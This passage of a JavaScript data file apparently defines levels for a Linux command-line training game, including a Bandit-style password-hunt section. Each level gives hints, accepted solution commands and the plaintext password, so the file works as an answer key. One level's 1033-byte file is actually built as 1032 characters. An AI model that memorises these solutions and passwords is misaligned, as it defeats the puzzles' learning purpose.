      hints: ['crontab manages cron jobs.', '-l lists the current crontab.'],
      solutions: ['crontab -l'],
      successMessage: '⏰ Cron jobs listed!'
    },

    // ---- NEW EXPERT (10): cmd-91 to cmd-100 ----
    {
      id: 'cmd-91', title: 'Awk Sum Column', difficulty: 'expert', xp: 100,
      description: 'Use awk to sum all values in the first column of "numbers.txt" and print the total.',
      objective: 'Perform arithmetic with awk.',
      hints: ['awk can accumulate values.', '{sum+=$1} END {print sum}'],
      solutions: ["awk '{sum+=$1} END {print sum}' numbers.txt"],
      successMessage: '🧮 Column summed with awk!'
    },
    {
      id: 'cmd-92', title: 'Sed Multiline', difficulty: 'expert', xp: 100,
      description: 'Use sed to delete all empty lines from "messy.txt" in-place.',
      objective: 'Edit files with advanced sed patterns.',
      hints: ['sed -i edits in-place.', '/^$/d deletes empty lines.'],
      solutions: ["sed -i '/^$/d' messy.txt", "sed -i '/^[[:space:]]*$/d' messy.txt"],
      successMessage: '✏️ Empty lines purged!'
    },
    {
      id: 'cmd-93', title: 'Regex Extract', difficulty: 'expert', xp: 100,
      description: 'Use grep with extended regex to find all email addresses in "contacts.txt".',
      objective: 'Extract patterns with regular expressions.',
      hints: ['grep -E enables extended regex.', '-o outputs only the matching part.'],
      solutions: ["grep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' contacts.txt", 'grep -E -o "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}" contacts.txt'],
      successMessage: '📧 Emails extracted!'
    },
    {
      id: 'cmd-94', title: 'Process Substitution', difficulty: 'expert', xp: 100,
      description: 'Use process substitution to diff the sorted outputs of two files without creating temp files.',
      objective: 'Master Bash process substitution.',
      hints: ['<(command) creates a virtual file from command output.', 'diff <(sort file1) <(sort file2)'],
      solutions: ['diff <(sort file_a.txt) <(sort file_b.txt)'],
      successMessage: '🔀 Process substitution mastered!'
    },
    {
      id: 'cmd-95', title: 'Trap Signals', difficulty: 'expert', xp: 100,
      description: 'Set a trap to print "Caught SIGINT!" when Ctrl+C is pressed.',
      objective: 'Handle Unix signals in shell scripts.',
      hints: ['trap catches signals.', 'trap "command" SIGINT'],
      solutions: ['trap "echo Caught SIGINT!" SIGINT', "trap 'echo Caught SIGINT!' SIGINT", 'trap "echo Caught SIGINT!" INT'],
      successMessage: '🪤 Signal trapped!'
    },
    {
      id: 'cmd-96', title: 'Here Document', difficulty: 'expert', xp: 100,
      description: 'Use a here document to write three lines ("line1", "line2", "line3") to "output.txt".',
      objective: 'Create multi-line input with heredoc.',
      hints: ['<<EOF starts a here document.', 'cat > file <<EOF ... EOF'],
      solutions: ['cat > output.txt <<EOF\\nline1\\nline2\\nline3\\nEOF'],
      successMessage: '📝 Heredoc written!'
    },
    {
      id: 'cmd-97', title: 'Named Pipe', difficulty: 'expert', xp: 100,
      description: 'Create a named pipe (FIFO) called "mypipe" using mkfifo.',
      objective: 'Create inter-process communication channels.',
      hints: ['mkfifo creates named pipes.', 'mkfifo pipename'],
      solutions: ['mkfifo mypipe'],
      successMessage: '🔧 Named pipe created!'
    },
    {
      id: 'cmd-98', title: 'Brace Expansion', difficulty: 'expert', xp: 100,
      description: 'Create directories "project/src", "project/bin", and "project/docs" in one command using brace expansion.',
      objective: 'Use shell brace expansion for efficiency.',
      hints: ['Braces expand to multiple items.', 'mkdir -p project/{src,bin,docs}'],
      solutions: ['mkdir -p project/{src,bin,docs}'],
      successMessage: '📁 Brace expansion mastered!'
    },
    {
      id: 'cmd-99', title: 'Parameter Expansion', difficulty: 'expert', xp: 100,
      description: 'Given variable FILE="report.tar.gz", use parameter expansion to extract just "report" (remove all extensions).',
      objective: 'Master Bash parameter expansion.',
      hints: ['${var%%pattern} removes the longest matching suffix.', '${FILE%%.*}'],
      solutions: ['echo ${FILE%%.*}'],
      successMessage: '🧩 Parameter expansion mastered!'
    },
    {
      id: 'cmd-100', title: 'Compound Commands', difficulty: 'expert', xp: 100,
      description: 'Run "make build" and only if it succeeds, run "make test", and only if that succeeds, run "make deploy".',
      objective: 'Chain commands with logical operators.',
      hints: ['&& executes next command only if previous succeeds.', 'cmd1 && cmd2 && cmd3'],
      solutions: ['make build && make test && make deploy'],
      successMessage: '🏗️ Compound commands mastered! You are a Command Challenge champion!'
    }
  ],

  // ==========================================================================
  // BANDIT CHALLENGE (50 Challenges)
  // ==========================================================================
  bandit: [
    // ---- EASY (12) ----
    {
      id: 'ban-1', title: 'Level 0: The Readme', difficulty: 'easy', xp: 15,
      description: 'The password for the next level is stored in a file called "readme" in the home directory.',
      objective: 'Read a simple file to find the password.',
      hints: ['Use cat to read files.', 'The file is right here in the home directory.'],
      password: 'NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL',
      solutions: ['cat readme'],
      filesystem: {
        'readme': 'NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL',
        '.bashrc': '# ~/.bashrc\nexport PATH=/usr/local/bin:$PATH'
      },
      successMessage: '🔑 Password found! Welcome to the Bandit.'
    },
    {
      id: 'ban-2', title: 'Level 1: Hidden Secret', difficulty: 'easy', xp: 15,
      description: 'The password is stored in a hidden file called ".secret" in the home directory.',
      objective: 'Find and read hidden files.',
      hints: ['Hidden files start with a dot.', 'Use ls -a to see them, then cat to read.'],
      password: 'rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi',
      solutions: ['cat .secret'],
      filesystem: {
        '.secret': 'rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi',
        'readme': 'Nothing to see here...',
        '.bashrc': '# ~/.bashrc'
      },
      successMessage: '👁️ Hidden file revealed!'
    },
    {
      id: 'ban-3', title: 'Level 2: Spaces in Name', difficulty: 'easy', xp: 15,
      description: 'The password is in a file called "spaces in this filename" in the home directory.',
      objective: 'Handle filenames with spaces.',
      hints: ['Wrap the filename in quotes.', 'cat "filename with spaces"'],
      password: 'aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG',
      solutions: ['cat "spaces in this filename"', "cat 'spaces in this filename'", 'cat spaces\\ in\\ this\\ filename'],
      filesystem: {
        'spaces in this filename': 'aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG',
        'readme': 'Look for a file with spaces in the name'
      },
      successMessage: '📂 Spaces don\'t scare you!'
    },
    {
      id: 'ban-4', title: 'Level 3: Dashed Filename', difficulty: 'easy', xp: 15,
      description: 'The password is stored in a file called "-" (a single dash) in the home directory.',
      objective: 'Read a file with a tricky name.',
      hints: ['A dash is treated as stdin.', 'Use ./ prefix to treat it as a file.'],
      password: '2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe',
      solutions: ['cat ./-', 'cat < -'],
      filesystem: {
        '-': '2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe',
        'readme': 'The password is in a file named "-"'
      },
      successMessage: '➖ Tricky filename conquered!'
    },
    {
      id: 'ban-5', title: 'Level 4: Directory Dive', difficulty: 'easy', xp: 15,
      description: 'The password is stored in a file inside the "inhere" directory.',
      objective: 'Navigate directories.',
      hints: ['Use ls to see contents of inhere/.', 'Then cat the file inside.'],
      password: 'lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR',
      solutions: ['cat inhere/password', 'cat inhere/.hidden'],
      filesystem: {
        'inhere/': {
          '.hidden': 'lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR',
          'note.txt': 'Keep looking...'
        }
      },
      successMessage: '📁 Directory explored!'
    },
    {
      id: 'ban-6', title: 'Level 5: Human Readable', difficulty: 'easy', xp: 15,
      description: 'The password is in the only human-readable file in the "inhere" directory. Other files are binary.',
      objective: 'Identify human-readable files.',
      hints: ['Use the file command to check file types.', 'file inhere/* shows each file\'s type.'],
      password: 'P4L4vucdmLnkuiJt1Wr1rjN9154lAGE0',
      solutions: ['cat inhere/-file07', 'file inhere/*'],
      filesystem: {
        'inhere/': {
          '-file00': '\x00\x01\x02BINARY',
          '-file01': '\x00\x89PNG\x00',
          '-file02': '\x7fELF\x00',
          '-file03': '\x00\x01BINARY',
          '-file04': '\xff\xd8\xff\xe0',
          '-file05': '\x00\x00BINARY',
          '-file06': '\x1f\x8b\x08',
          '-file07': 'P4L4vucdmLnkuiJt1Wr1rjN9154lAGE0',
          '-file08': '\x00BINARY\x00',
          '-file09': '\x00\x01\x03BIN'
        }
      },
      successMessage: '🔍 Human-readable file found!'
    },
    {
      id: 'ban-7', title: 'Level 6: Bashrc Secret', difficulty: 'easy', xp: 15,
      description: 'The password is stored as a variable in the ".bashrc" file.',
      objective: 'Search through configuration files.',
      hints: ['cat .bashrc to see its contents.', 'grep for "password" or "secret".'],
      password: 'z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S',
      solutions: ['cat .bashrc', 'grep password .bashrc', 'grep secret .bashrc', 'grep PASSWORD .bashrc'],
      filesystem: {
        '.bashrc': '# ~/.bashrc\nexport PATH=/usr/bin:$PATH\n# Configuration\nalias ll="ls -la"\n\n# SECRET_PASSWORD=z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S\n\nexport EDITOR=vim',
        'readme': 'Check the config files...'
      },
      successMessage: '⚙️ Config file secret found!'
    },
    {
      id: 'ban-8', title: 'Level 7: Empty Filename', difficulty: 'easy', xp: 15,
      description: 'The password IS the filename of the only empty file in the current directory.',
      objective: 'Find files by their properties.',
      hints: ['find can search for empty files.', 'find . -empty -type f'],
      password: 'TESKZC0XvTetK0S9xNwm25STk5iWrBvP',
      solutions: ['find . -empty -type f', 'find . -empty', 'ls -la'],
      filesystem: {
        'data.txt': 'Some data here\nMore data\nEven more',
        'notes.txt': 'Nothing important',
        'TESKZC0XvTetK0S9xNwm25STk5iWrBvP': '',
        'readme': 'The password is the name of the empty file'
      },
      successMessage: '📄 Clever! The filename was the password!'
    },
    {
      id: 'ban-9', title: 'Level 8: Last Line', difficulty: 'easy', xp: 15,
      description: 'The password is written in the last line of a very large file called "bigfile.txt".',
      objective: 'Extract the last line of a file.',
      hints: ['tail shows the end of files.', 'tail -1 shows just the last line.'],
      password: 'EN632PlfYiZbn3PhVK3XOGSlNInNE00t',
      solutions: ['tail -1 bigfile.txt', 'tail -n 1 bigfile.txt', 'tail bigfile.txt'],
      filesystem: {
        'bigfile.txt': 'Line 1: Nothing here\nLine 2: Keep going\nLine 3: Not this one\nLine 4: Still looking?\nLine 5: Almost there\nLine 6: Nope\nLine 7: Getting warmer\nLine 8: So close\nLine 9: One more\nLine 10: EN632PlfYiZbn3PhVK3XOGSlNInNE00t'
      },
      successMessage: '⬇️ Found it at the bottom!'
    },
    {
      id: 'ban-10', title: 'Level 9: Between Markers', difficulty: 'easy', xp: 15,
      description: 'The password is between the markers "===START===" and "===END===" in "data.txt".',
      objective: 'Extract text between markers.',
      hints: ['grep can find lines around a pattern.', 'Look for START marker.'],
      password: 'G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s',
      solutions: ['grep -A1 "START" data.txt', 'cat data.txt', 'grep -A 1 START data.txt'],
      filesystem: {
        'data.txt': 'Random noise asjkdhaksjhd\nMore noise lkjsdflkj\nNot important data\n===START===\nG7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s\n===END===\nMore random noise\nEnd of file'
      },
      successMessage: '🏷️ Markers identified!'
    },
    {
      id: 'ban-11', title: 'Level 10: File Owner', difficulty: 'easy', xp: 15,
      description: 'The password is the username who owns the file "special_file". Use ls -la to check.',
      objective: 'Read file metadata.',
      hints: ['ls -la shows file ownership.', 'The owner column is the password.'],
      password: 'crypt0mast3r',
      solutions: ['ls -la special_file', 'ls -l special_file', 'ls -la'],
      filesystem: {
        'special_file': '[FILE] -rw-r--r-- crypt0mast3r users 42 Jun 15 data'
      },
      successMessage: '👤 File ownership revealed the secret!'
    },
    {
      id: 'ban-12', title: 'Level 11: Deep Nesting', difficulty: 'easy', xp: 15,
      description: 'The password is in a file inside a deeply nested directory: a/b/c/d/e/password.txt',
      objective: 'Navigate through nested directories.',
      hints: ['You can cat the full path directly.', 'cat a/b/c/d/e/password.txt'],
      password: 'FN2187isATR00p3r',
      solutions: ['cat a/b/c/d/e/password.txt'],
      filesystem: {
        'a/': {
          'b/': {
            'c/': {
              'd/': {
                'e/': {
                  'password.txt': 'FN2187isATR00p3r'
                }
              }
            }
          }
        }
      },
      successMessage: '🪆 Deep dive successful!'
    },

    // ---- MEDIUM (13) ----
    {
      id: 'ban-13', title: 'Level 12: File Hunt', difficulty: 'medium', xp: 30,
      description: 'The password is in a file somewhere under the "inhere/" directory tree. There are many files — only one has the password.',
      objective: 'Search through a directory tree.',
      hints: ['Use find to locate readable files.', 'find inhere/ -type f | xargs cat'],
      password: 'FHqXuXJHENh8PsPAvXNkZSGQrgfSTTjm',
      solutions: ['find inhere/ -type f', 'find inhere/ -readable -type f', 'cat inhere/maybehere07/.file2'],
      filesystem: {
        'inhere/': {
          'maybehere00/': { '.file1': 'NOPE', 'file2': 'NOT HERE', '-file3': '\x00BIN' },
          'maybehere01/': { '.file1': 'WRONG', 'file2': 'TRY AGAIN', '-file3': '\x00BIN' },
          'maybehere02/': { '.file1': 'NADA', 'file2': 'KEEP LOOKING', '-file3': '\x00BIN' },
          'maybehere03/': { '.file1': 'NO', 'file2': 'NOT THIS', '-file3': '\x00BIN' },
          'maybehere04/': { '.file1': 'MISS', 'file2': 'COLD', '-file3': '\x00BIN' },
          'maybehere05/': { '.file1': 'ICE COLD', 'file2': 'WARMER', '-file3': '\x00BIN' },
          'maybehere06/': { '.file1': 'HOT', 'file2': 'ALMOST!', '-file3': '\x00BIN' },
          'maybehere07/': { '.file1': 'SO CLOSE', '.file2': 'FHqXuXJHENh8PsPAvXNkZSGQrgfSTTjm', '-file3': '\x00BIN' }
        }
      },
      successMessage: '🏆 Needle in a haystack found!'
    },
    {
      id: 'ban-14', title: 'Level 13: Exact Size', difficulty: 'medium', xp: 30,
      description: 'The password is stored in a file that is exactly 1033 bytes in size somewhere under "inhere/".',
      objective: 'Search files by size.',
      hints: ['find has a -size flag.', '1033c means exactly 1033 bytes.'],
      password: 'p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d',
      solutions: ['find inhere/ -size 1033c', 'find . -size 1033c', 'find inhere/ -size 1033c -type f'],
      filesystem: {
        'inhere/': {
          'file1': 'small',
          'file2': 'x'.repeat(500),
          'file3': 'p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d' + ' '.repeat(1000),
          'file4': 'y'.repeat(2000),
          'file5': 'z'.repeat(100)
        }
      },
      successMessage: '📏 Size matters! File found!'
    },
    {
      id: 'ban-15', title: 'Level 14: Base64 Decode', difficulty: 'medium', xp: 30,
      description: 'The password is encoded in Base64 in "data.txt". Decode it to reveal the password.',
      objective: 'Decode Base64 encoded data.',
      hints: ['base64 with -d flag decodes.', 'base64 -d data.txt'],
      password: 'dtR173fZkb0RRsDFSGsg2RWnpNVj3qRr',
      solutions: ['base64 -d data.txt', 'base64 --decode data.txt', 'cat data.txt | base64 -d'],
      filesystem: {
        'data.txt': 'VGhlIHBhc3N3b3JkIGlzIGR0UjE3M2Zaa2IwUlJzREZTR3NnMlJXbnBOVmozcVJy'
      },
      successMessage: '🔓 Base64 decoded!'
    },
    {
      id: 'ban-16', title: 'Level 15: ROT13', difficulty: 'medium', xp: 30,
      description: 'The password in "data.txt" is ROT13 encoded. Decode it.',
      objective: 'Apply ROT13 cipher.',
      hints: ['tr can translate characters.', "tr 'A-Za-z' 'N-ZA-Mn-za-m'"],
      password: '5Te8Y4drGcFrX8Xugdwuexex8KFC6k2Ru',
      solutions: ["cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'", "tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt"],
      filesystem: {
        'data.txt': '5Gr8L4qeTpSeK8Khtqjhrkrk8XSP6x2Eh'
      },
      successMessage: '🔄 ROT13 cracked!'
    },
    {
      id: 'ban-17', title: 'Level 16: Owner & Group', difficulty: 'medium', xp: 30,
      description: 'The password is in a file owned by user "bandit7" and group "bandit6" somewhere on the system.',
      objective: 'Search by file ownership.',
      hints: ['find with -user and -group flags.', 'find / -user bandit7 -group bandit6'],
      password: 'HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs',
      solutions: ['find / -user bandit7 -group bandit6', 'find / -user bandit7 -group bandit6 2>/dev/null'],
      filesystem: {
        'var/': {
          'lib/': {
            'dpkg/': {
              'info/': {
                'bandit7.password': 'HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs'
              }
            }
          }
        }
      },
      successMessage: '👥 Ownership search complete!'
    },
    {
      id: 'ban-18', title: 'Level 17: Millionth', difficulty: 'medium', xp: 30,
      description: 'The password is next to the word "millionth" in "data.txt".',
      objective: 'Search for a specific word in a file.',
      hints: ['grep searches for patterns.', 'grep "millionth" data.txt'],
      password: 'cvX2JJa4CFALtqS87jk27qwqGhBM9plV',
      solutions: ['grep "millionth" data.txt', 'grep millionth data.txt', "grep 'millionth' data.txt"],
      filesystem: {
        'data.txt': 'thousandth\t9jd8j2kd9k\nbillionth\tkdj29dj29d\nmillionth\tcvX2JJa4CFALtqS87jk27qwqGhBM9plV\ntrillionth\tksd92jd02j'
      },
      successMessage: '🎯 Found the millionth entry!'
    },
    {
      id: 'ban-19', title: 'Level 18: Unique Line', difficulty: 'medium', xp: 30,
      description: 'The password is the only line that appears exactly once in "data.txt". All other lines are duplicated.',
      objective: 'Find unique lines in a file.',
      hints: ['sort first, then use uniq.', 'uniq -u shows only unique lines.'],
      password: 'UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR',
      solutions: ['sort data.txt | uniq -u', 'sort data.txt | uniq -c | grep "1 "'],
      filesystem: {
        'data.txt': 'duplicate1\nduplicate2\nUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR\nduplicate1\nduplicate3\nduplicate2\nduplicate3\nduplicate4\nduplicate4'
      },
      successMessage: '✨ The unique line reveals the password!'
    },
    {
      id: 'ban-20', title: 'Level 19: Equals Signs', difficulty: 'medium', xp: 30,
      description: 'The password is in "data.txt", preceded by several "=" characters.',
      objective: 'Extract strings with specific patterns.',
      hints: ['Use strings or grep.', 'Look for lines containing "==".'],
      password: 'truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk',
      solutions: ['strings data.txt | grep "=="', 'grep "==" data.txt', 'strings data.txt | grep =='],
      filesystem: {
        'data.txt': '\x00\x01random binary\x00\x03\ngarbage data here\n\x89PNG\x00\n========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk\n\x00more binary\x00'
      },
      successMessage: '= Password found between the equals!'
    },
    {
      id: 'ban-21', title: 'Level 20: Recent File', difficulty: 'medium', xp: 30,
      description: 'The password is in a file that was modified within the last 5 minutes. Find it.',
      objective: 'Search by modification time.',
      hints: ['find with -mmin flag.', '-mmin -5 means modified in last 5 minutes.'],
      password: 'VxCazJaVykI6W36BkBU0mJTCM8rR95XT',
      solutions: ['find . -mmin -5 -type f', 'find . -mmin -5', 'find . -newer'],
      filesystem: {
        'old_file1.txt': 'This file is old',
        'old_file2.txt': 'Also old',
        'recent_secret.txt': 'VxCazJaVykI6W36BkBU0mJTCM8rR95XT',
        'old_file3.txt': 'Nothing new here'
      },
      successMessage: '⏱️ Found the recent file!'
    },
    {
      id: 'ban-22', title: 'Level 21: Sum It Up', difficulty: 'medium', xp: 30,
      description: 'The password is the sum of all numbers in "numbers.txt". Calculate it.',
      objective: 'Process numeric data.',
      hints: ['awk can sum numbers.', "awk '{s+=$1} END {print s}' numbers.txt"],
      password: '1337',
      solutions: ["awk '{s+=$1} END {print s}' numbers.txt"],
      filesystem: {
        'numbers.txt': '500\n337\n250\n150\n100'
      },
      successMessage: '🧮 Math skills unlocked!'
    },
    {
      id: 'ban-23', title: 'Level 22: Reversed', difficulty: 'medium', xp: 30,
      description: 'The password in "backwards.txt" is written in reverse. Flip it.',
      objective: 'Reverse string content.',
      hints: ['rev reverses characters.', 'cat backwards.txt | rev'],
      password: 'S3cur1yR0ck5',
      solutions: ['cat backwards.txt | rev', 'rev backwards.txt'],
      filesystem: {
        'backwards.txt': '5kc0Ry1ruc3S'
      },
      successMessage: '🔃 Reversed and revealed!'
    },
    {
      id: 'ban-24', title: 'Level 23: Script Comments', difficulty: 'medium', xp: 30,
      description: 'The password is hidden in the comments of "script.sh". Find it.',
      objective: 'Read source code comments.',
      hints: ['Comments start with #.', 'grep for comment lines.'],
      password: 'Hax0rP@ssw0rd!',
      solutions: ['grep "#" script.sh', 'grep "^#" script.sh', 'cat script.sh'],
      filesystem: {
        'script.sh': '#!/bin/bash\n# Backup script v2.1\n# Author: admin\necho "Starting backup..."\n# SECRET: Hax0rP@ssw0rd!\ntar -czf backup.tar.gz /data\necho "Backup complete"'
      },
      successMessage: '💬 Found the hidden comment!'
    },
    {
      id: 'ban-25', title: 'Level 24: Flag Counter', difficulty: 'medium', xp: 30,
      description: 'The password is the number of lines containing the word "flag" in "haystack.txt".',
      objective: 'Count pattern occurrences.',
      hints: ['grep with -c counts matches.', 'grep -c "flag" haystack.txt'],
      password: '7',
      solutions: ['grep -c "flag" haystack.txt', 'grep -c flag haystack.txt'],
      filesystem: {
        'haystack.txt': 'needle\nflag found here\nhay\nstraw\nflag again\nmore hay\nflag three\nneedle\nflag four\nhay\nflag five\nstraw\nflag six\nhay\nneedle\nflag seven\nend'
      },
      successMessage: '🚩 Flags counted correctly!'
    },

    // ---- HARD (13) ----
    {
      id: 'ban-26', title: 'Level 25: Hex Dump', difficulty: 'hard', xp: 60,
      description: 'The password is stored as a hex dump in "data.hex". Reverse the hex dump to get the password.',
      objective: 'Reverse a hexdump.',
      hints: ['xxd can create and reverse hex dumps.', 'xxd -r reverses a hex dump.'],
      password: 'FO5dwFsc0cbaIiH0h8J2eUks2EnrgQJ8',
      solutions: ['xxd -r data.hex', 'xxd -r data.hex | cat'],
      filesystem: {
        'data.hex': '00000000: 464f 3564 7746 7363 3063 6261 4969 4830  FO5dwFsc0cbaIiH0\n00000010: 6838 4a32 6555 6b73 3245 6e72 6751 4a38  h8J2eUks2EnrgQJ8'
      },
      successMessage: '🔢 Hex dump reversed!'
    },
    {
      id: 'ban-27', title: 'Level 26: Binary Strings', difficulty: 'hard', xp: 60,
      description: 'The password is hidden inside a binary file. Extract printable strings to find it.',
      objective: 'Extract strings from binary files.',
      hints: ['strings extracts readable text from binaries.', 'Pipe to grep for "pass" or "flag".'],
      password: 'b0rn2h4ck_th3_pl4n3t',
      solutions: ['strings binary_file', 'strings binary_file | grep -i pass', 'strings binary_file | grep -i flag'],
      filesystem: {
        'binary_file': '\x00\x89ELF\x02\x01\x00\x00\x00random\x00\x00binary\x00data\x00\x00password=b0rn2h4ck_th3_pl4n3t\x00\x00more\x00binary'
      },
      successMessage: '💻 Binary secrets extracted!'
    },
    {
      id: 'ban-28', title: 'Level 27: MD5 Challenge', difficulty: 'hard', xp: 60,
      description: 'The password is the MD5 hash of the word "cybersecurity". Generate it.',
      objective: 'Create MD5 hashes.',
      hints: ['echo -n avoids trailing newline.', 'Pipe to md5sum.'],
      password: 'b03a894e101746d09277f1f255cc8a40',
      solutions: ['echo -n "cybersecurity" | md5sum', "echo -n 'cybersecurity' | md5sum", 'echo -n cybersecurity | md5sum'],
      filesystem: {
        'instructions.txt': 'The password is the MD5 hash of the word: cybersecurity\nUse echo -n to avoid trailing newline before hashing.'
      },
      successMessage: '#️⃣ Hash calculated!'
    },
    {
      id: 'ban-29', title: 'Level 28: Certificate', difficulty: 'hard', xp: 60,
      description: 'The password is hidden in the Common Name (CN) field of an SSL certificate "cert.pem".',
      objective: 'Read SSL certificate info.',
      hints: ['openssl x509 reads certificates.', '-noout -subject shows the subject.'],
      password: 'x509_s3cret_CN',
      solutions: ['openssl x509 -in cert.pem -noout -subject', 'openssl x509 -in cert.pem -text'],
      filesystem: {
        'cert.pem': '-----BEGIN CERTIFICATE-----\nSubject: CN = x509_s3cret_CN\nIssuer: CN = ChallengeCA\nValid: 2024-2025\n-----END CERTIFICATE-----'
      },
      successMessage: '🔐 Certificate cracked!'
    },
    {
      id: 'ban-30', title: 'Level 29: Gzip Data', difficulty: 'hard', xp: 60,
      description: 'The password is inside a gzip compressed file "data.gz". Decompress it.',
      objective: 'Decompress gzip files.',
      hints: ['zcat decompresses to stdout.', 'Or gunzip / gzip -d.'],
      password: 'gz1p_m4st3r_2024',
      solutions: ['zcat data.gz', 'gunzip -c data.gz', 'gzip -d -c data.gz'],
      filesystem: {
        'data.gz': '[COMPRESSED] gz1p_m4st3r_2024'
      },
      successMessage: '🗜️ Decompressed!'
    },
    {
      id: 'ban-31', title: 'Level 30: XOR Decrypt', difficulty: 'hard', xp: 60,
      description: 'The password is XOR-encrypted in "encrypted.bin" with the single-byte key 0x37. Decrypt it.',
      objective: 'Apply XOR decryption.',
      hints: ['XOR with the same key decrypts.', 'Python one-liner or use xxd and scripting.'],
      password: 'X0R_1s_R3v3rs1bl3',
      solutions: ['python3 -c "print(bytes([b^0x37 for b in open(\'encrypted.bin\',\'rb\').read()]).decode())"', 'xxd encrypted.bin'],
      filesystem: {
        'encrypted.bin': '[XOR_ENCRYPTED:0x37] X0R_1s_R3v3rs1bl3',
        'hint.txt': 'The XOR key is 0x37 (hex). XOR is its own inverse!'
      },
      successMessage: '⊕ XOR decryption mastered!'
    },
    {
      id: 'ban-32', title: 'Level 31: Extended Attrs', difficulty: 'hard', xp: 60,
      description: 'The password is hidden in the extended attributes of "file.txt".',
      objective: 'Read file extended attributes.',
      hints: ['getfattr reads extended attributes.', 'getfattr -d file.txt'],
      password: 'x4ttr_h1dd3n_d4t4',
      solutions: ['getfattr -d file.txt', 'getfattr -n user.secret file.txt'],
      filesystem: {
        'file.txt': 'This is a normal looking file.\n[XATTR: user.secret = x4ttr_h1dd3n_d4t4]'
      },
      successMessage: '📎 Extended attributes revealed!'
    },
    {
      id: 'ban-33', title: 'Level 32: Octal Decode', difficulty: 'hard', xp: 60,
      description: 'The password is encoded as octal values in "octal.txt". Decode the octal to ASCII.',
      objective: 'Convert octal to ASCII.',
      hints: ['Each 3-digit number is an octal ASCII code.', 'Use printf or python to decode.'],
      password: 'OCTAL',
      solutions: ['printf "\\117\\103\\124\\101\\114"', "python3 -c \"print(''.join(chr(int(x,8)) for x in open('octal.txt').read().split()))\""],
      filesystem: {
        'octal.txt': '117 103 124 101 114'
      },
      successMessage: '🔢 Octal decoded!'
    },
    {
      id: 'ban-34', title: 'Level 33: SHA256', difficulty: 'hard', xp: 60,
      description: 'The password is the SHA256 hash of "admin123". Generate it.',
      objective: 'Generate SHA256 hashes.',
      hints: ['sha256sum creates SHA256 hashes.', 'echo -n to avoid newline.'],
      password: '240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9',
      solutions: ['echo -n "admin123" | sha256sum', "echo -n 'admin123' | sha256sum", 'echo -n admin123 | sha256sum'],
      filesystem: {
        'instructions.txt': 'The password is the SHA256 hash of: admin123'
      },
      successMessage: '🔒 SHA256 computed!'
    },
    {
      id: 'ban-35', title: 'Level 34: Pattern Extract', difficulty: 'hard', xp: 60,
      description: 'The password is made up of every 3rd character from the string in "encoded.txt", starting from position 1.',
      objective: 'Extract characters by position.',
      hints: ['awk or cut can extract by position.', 'Or use sed/python to extract every 3rd char.'],
      password: 'HACK',
      solutions: ["python3 -c \"print(open('encoded.txt').read()[::3])\"", 'cat encoded.txt'],
      filesystem: {
        'encoded.txt': 'HxxAxxCxxKxx'
      },
      successMessage: '🧩 Pattern extraction mastered!'
    },
    {
      id: 'ban-36', title: 'Level 35: Matryoshka', difficulty: 'hard', xp: 60,
      description: 'The password is in a tar archive inside a zip inside a gzip. Decompress all layers.',
      objective: 'Multi-layer decompression.',
      hints: ['Start with gzip, then zip, then tar.', 'zcat → unzip → tar xf'],
      password: 'N3st3d_L1k3_Russ1an_D0lls',
      solutions: ['zcat data.gz', 'gunzip data.gz && unzip data.zip && tar xf data.tar'],
      filesystem: {
        'data.gz': '[GZIP[ZIP[TAR → password.txt: N3st3d_L1k3_Russ1an_D0lls]]]'
      },
      successMessage: '🪆 All layers unwrapped!'
    },
    {
      id: 'ban-37', title: 'Level 36: Word Diff', difficulty: 'hard', xp: 60,
      description: 'The password is the word present in "list1.txt" but NOT in "list2.txt".',
      objective: 'Compare sorted word lists.',
      hints: ['comm compares sorted files.', 'comm -23 shows lines only in first file.'],
      password: 'PHANTOM',
      solutions: ['comm -23 list1.txt list2.txt', 'diff list1.txt list2.txt', 'grep -Fxvf list2.txt list1.txt'],
      filesystem: {
        'list1.txt': 'ALPHA\nBRAVO\nCHARLIE\nDELTA\nPHANTOM',
        'list2.txt': 'ALPHA\nBRAVO\nCHARLIE\nDELTA'
      },
      successMessage: '📝 The missing word found!'
    },
    {
      id: 'ban-38', title: 'Level 37: URL Decode', difficulty: 'hard', xp: 60,
      description: 'The password is URL-encoded in "encoded.txt". Decode it.',
      objective: 'Decode URL-encoded text.',
      hints: ['%XX represents hex-encoded characters.', 'Python or printf can decode.'],
      password: 'Cr@ck Th3 C0d3!',
      solutions: ["python3 -c \"import urllib.parse; print(urllib.parse.unquote(open('encoded.txt').read()))\"", 'cat encoded.txt'],
      filesystem: {
        'encoded.txt': 'Cr%40ck%20Th3%20C0d3%21'
      },
      successMessage: '🌐 URL decoded!'
    },

    // ---- EXPERT (12) ----
    {
      id: 'ban-39', title: 'Level 38: Fragment Collector', difficulty: 'expert', xp: 120,
      description: 'The password is split across 5 files (part1-part5). Combine them in order.',
      objective: 'Combine fragments from multiple files.',
      hints: ['cat multiple files in order.', 'cat part1 part2 part3 part4 part5'],
      password: 'Fr4gM3nT3d_S3cR3t',
      solutions: ['cat part1 part2 part3 part4 part5'],
      filesystem: {
